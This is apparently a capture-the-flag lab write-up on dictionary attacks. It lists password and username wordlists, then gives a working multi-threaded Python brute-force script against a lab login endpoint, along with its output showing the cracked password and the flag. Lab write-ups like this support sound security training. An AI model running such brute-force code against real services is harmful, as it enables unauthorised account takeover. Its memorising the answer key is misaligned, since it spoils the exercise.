# Dictionary Attacks

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Wordlist</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Description</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Typical Use</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Source</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">rockyou.txt</code></td><td class="p-4">A popular password wordlist containing millions of passwords leaked from the RockYou breach.</td><td class="p-4">Commonly used for password brute force attacks.</td><td class="p-4"><a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" rel="nofollow" target="_blank" class="hover:underline text-green-400">RockYou breach dataset</a></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">top-usernames-shortlist.txt</code></td><td class="p-4">A concise list of the most common usernames.</td><td class="p-4">Suitable for quick brute force username attempts.</td><td class="p-4"><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt" rel="nofollow" target="_blank" class="hover:underline text-green-400">SecLists</a></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">xato-net-10-million-usernames.txt</code></td><td class="p-4">A more extensive list of 10 million usernames.</td><td class="p-4">Used for thorough username brute forcing.</td><td class="p-4"><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt" rel="nofollow" target="_blank" class="hover:underline text-green-400">SecLists</a></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">2023-200_most_used_passwords.txt</code></td><td class="p-4">A list of the 200 most commonly used passwords as of 2023.</td><td class="p-4">Effective for targeting commonly reused passwords.</td><td class="p-4"><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt" rel="nofollow" target="_blank" class="hover:underline text-green-400">SecLists</a></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Default-Credentials/default-passwords.txt</code></td><td class="p-4">A list of default usernames and passwords commonly used in routers, software, and other devices.</td><td class="p-4">Ideal for trying default credentials.</td><td class="p-4"><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt" rel="nofollow" target="_blank" class="hover:underline text-green-400">SecLists</a></td></tr></tbody></table>

## Questions
1. After successfully brute-forcing the target using the script, what is the full flag the script returns? **Answer:**
   - Use this multi thread script for the dictionary attack:
        ```sh
        $ cat dictionary-solver-v2.py 
        import requests
        from concurrent.futures import ThreadPoolExecutor, as_completed

        # Configuration
        IP = "154.57.164.79"
        PORT = 31672
        THREADS = 20  # Number of simultaneous login attempts
        PASSWORD_LIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"

        def check_password(password):
            """Function to attempt a single password login."""
            url = f"http://{IP}:{PORT}/dictionary"
            try:
                # Using a small timeout to prevent the script from hanging
                response = requests.post(url, data={'password': password}, timeout=5)
                
                if response.ok:
                    data = response.json()
                    if 'flag' in data:
                        return f"\n[SUCCESS] Correct password found: {password}\nFlag: {data['flag']}"
            except Exception as e:
                return f"Error testing {password}: {e}"
            
            return None

        def main():
            print(f"Fetching password list...")
            try:
                raw_data = requests.get(PASSWORD_LIST_URL).text
                passwords = raw_data.splitlines()
            except Exception as e:
                print(f"Failed to download password list: {e}")
                return

            print(f"Starting dictionary attack with {THREADS} threads...")

            # Using ThreadPoolExecutor to run attempts in parallel
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                # Submit all password attempts to the executor
                future_to_pass = {executor.submit(check_password, pwd): pwd for pwd in passwords}

                for future in as_completed(future_to_pass):
                    result = future.result()
                    if result and "[SUCCESS]" in result:
                        print(result)
                        # Stop all other pending threads immediately
                        executor.shutdown(wait=False, cancel_futures=True)
                        return

            print("Search complete. No flag found.")

        if __name__ == "__main__":
            main()
        ```
   - Run the script and obtain the flag:
        ```sh
        $ python dictionary-solver-v2.py 
        Fetching password list...
        Starting dictionary attack with 20 threads...

        [SUCCESS] Correct password found: gateway
        Flag: HTB{Brut3_F0rc3_M4st3r}
        ```